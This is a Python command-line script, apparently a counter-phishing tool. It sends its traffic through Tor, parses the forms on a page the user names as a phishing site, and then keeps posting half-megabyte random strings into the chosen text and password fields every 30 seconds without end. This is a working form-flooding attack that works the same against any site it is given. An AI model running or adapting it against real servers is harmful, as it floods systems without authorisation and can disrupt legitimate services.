#!/usr/bin/env python3

import random
import string
import time

from collections import defaultdict
from html.parser import HTMLParser, HTMLParseError

import socket
import socks
def create_connection(address, timeout=None, source_address=None):
	sock = socks.socksocket()
	try:
		sock.connect(address)
	except ConnectionRefusedError:
		raise ConnectionRefusedError("ERROR: Could not connect to TOR proxy")
	return sock

socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
socket.socket = socks.socksocket
socket.create_connection = create_connection

import urllib.request, urllib.error
from urllib.parse import urlencode

class NoRedirection(urllib.request.HTTPErrorProcessor):
	def http_response(self, request, response):
		return response
	
	https_response = http_response

# Defaults
submitFrequency = 30

class Form():
	def __init__(self):
		self.postOrGet = None
		self.action = None

		self.hiddenFields = dict()
		self.textFields = list()
		self.passwordFields = list()

	def __str__(self):
		dat = "Form: " + self.postOrGet + " Action: " + self.action + "\n"
		for (name, value) in self.hiddenFields.items():
			dat += "\tHidden Field: " + name + " Value: " + value + "\n"
		for name in self.textFields:
			dat += "\tText Field: " + name + "\n"
		for password in self.passwordFields:
			dat += "\tPassword Field: " + password + "\n"
		return dat

	def buildData(self, fieldsToInject, randInjectLen=524288):
		def getShortRandStr():
				return getRandStr(random.randrange(10,15))
		def getLongRandStr(injectLen=None):
				return getRandStr(randInjectLen)
		def getRandStr(injectLen):
			return "".join(random.choice(string.ascii_uppercase +
				string.ascii_lowercase + string.digits)
				for _ in range(injectLen))

		dataTuples = list()
		for (name, value) in self.hiddenFields.items():
			dataTuples.append((name, value))
		for name in self.textFields:
			if name in fieldsToInject:
				dataTuples.append((name, getLongRandStr()))
			else:
				dataTuples.append((name, getShortRandStr()))
		for name in self.passwordFields:
			if name in fieldsToInject:
				dataTuples.append((name, getLongRandStr()))
			else:
				dataTuples.append((name, getShortRandStr()))

		return urlencode(dataTuples)

class PhishForms(HTMLParser):
	def __init__(self):
		self.inaform = False

		self.forms = list()
		self.currentForm = None
		super().__init__()

	def handle_starttag(self, tag, attrs):
		if tag == "form":
			if self.inaform:
				print("ERROR: Form in a form!  That's going to mess stuff up...")
			else:
				self.inaform = True
				self.currentForm = Form()
				for (field, content) in attrs:
					if field == "method":
						if content.lower() == "post":
							self.currentForm.postOrGet = "post"
						elif content.lower() == "get":
							self.currentForm.postOrGet = "get"
						else:
							print("ERROR: Form had invalid method, ", content)
					elif field == "action":
						if content.lower().startswith("javascript:"):
							print("ERROR: Form action begins with javascript:")
						self.currentForm.action = content
					else:
						pass # Ignoring other form fields for now

		elif tag == "input":
			if not self.inaform:
				print("ERROR: Input element outside of a form (or form-in-a-form)...  Ignoring!")
			else:
				dictAttrs = defaultdict(lambda:"")
				for (field, content) in attrs:
					dictAttrs[field] = content
				if dictAttrs["type"] == "hidden":
					self.currentForm.hiddenFields[dictAttrs["name"]] = dictAttrs["value"]
				elif dictAttrs["type"] == "text" or dictAttrs["type"] == "":
					self.currentForm.textFields.append(dictAttrs["name"])
				elif dictAttrs["type"] == "password":
					self.currentForm.passwordFields.append(dictAttrs["name"])


	def handle_endtag(self, tag):
		if tag == "form":
			if self.inaform:
				self.inaform = False
				if self.currentForm is not None:
					self.forms.append(self.currentForm)
					self.currentForm = None
			else:
				print("ERROR: End form tag outside of a form (or form-in-a-form)")



if __name__=="__main__":
	pf = PhishForms()
	phishURL = input("What's the phishing site? ")
	try:
		with urllib.request.urlopen(phishURL) as f:
			dat = f.read()
			print(dat[0:10])
			pf.feed(dat.decode("ascii"))
	except urllib.error.URLError as e:
		print(e.reason)
		exit(0)
	except socks.Socks5Error as e:
		print("ERROR: Proxy error:", str(e))
		exit(0)
	
	forms = pf.forms
	if pf.currentForm is not None:
		forms.append(pf.currentForm)
	enumForms = list(enumerate(forms))

	# Select the form to inject
	formNumber = -1
	while formNumber not in range(len(enumForms)):
		print("Which form is the phisher using?")
		for (index, form) in enumForms:
			print(index, ". ", form)
			print("\n\n")

		try:
			formNumber = int(input("Form number: "))
		except ValueError:
			formNumber = -1

	form = forms[formNumber]
	injectFields = list()

	# Select the text field to inject
	textFieldNum = -1
	while textFieldNum not in range(len(form.textFields)+1):
		print("Form number ", formNumber, "! Which text field do you want to mess with?")
		for (index, field) in enumerate(form.textFields):
			print(index, ". ", field)

		print(len(form.textFields),". No Text Field")

		try:
			textFieldNum = int(input("Field number: "))
		except ValueError:
			formNumber = -1

	try:
		injectFields.append(form.textFields[textFieldNum])
	except IndexError:
		pass # Anything down here should indicate "no text field desired"
	
	# Select the password field to inject
	passwordFieldNum = -1
	while passwordFieldNum not in range(len(form.passwordFields)+1):
		print("Form number ", formNumber, "! Which password field do you want to mess with?")
		for (index, field) in enumerate(form.passwordFields):
			print(index, ". ", field)

		print(len(form.passwordFields),". No Password Field")

		try:
			passwordFieldNum = int(input("Field number: "))
		except ValueError:
			formNumber = -1

	try:
		injectFields.append(form.passwordFields[passwordFieldNum])
	except IndexError:
		pass # Anything down here should indicate "no password field desired"
	
	data = form.buildData(injectFields)

	url = form.action
	if not url.startswith("http"):
		baseURL = phishURL[0:phishURL.rindex("/")]
		url = baseURL + "/" + form.action

	opener = urllib.request.build_opener(NoRedirection)

	sendIter=0
	while True:
		sendIter += 1
		print("Sending Iteration Number:", sendIter)
		if form.postOrGet == "get":
			with urllib.request.urlopen(url + "?" + data) as f:
				retval = f.read()
		else:
			with opener.open(url, bytes(data, "ascii")) as f:
				retval = f.read()
		print("  Sent", round(len(data)/1024), "KB")
		print("  Returned", len(retval), "bytes (redirections usually return 0)")
		print("  Sleeping", submitFrequency, "seconds")
		time.sleep(submitFrequency)
